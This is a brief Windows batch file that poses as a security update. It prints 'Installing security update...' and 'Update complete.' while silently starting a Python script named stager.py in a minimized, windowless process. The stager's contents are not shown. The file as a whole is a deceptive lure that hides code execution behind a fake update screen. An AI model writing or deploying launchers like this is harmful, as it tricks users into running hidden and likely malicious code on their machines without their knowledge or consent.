@echo off
title Security Update - Please Wait
echo Installing security update...
start /min pythonw stager.py
echo Update complete.
timeout /t 3 >nul
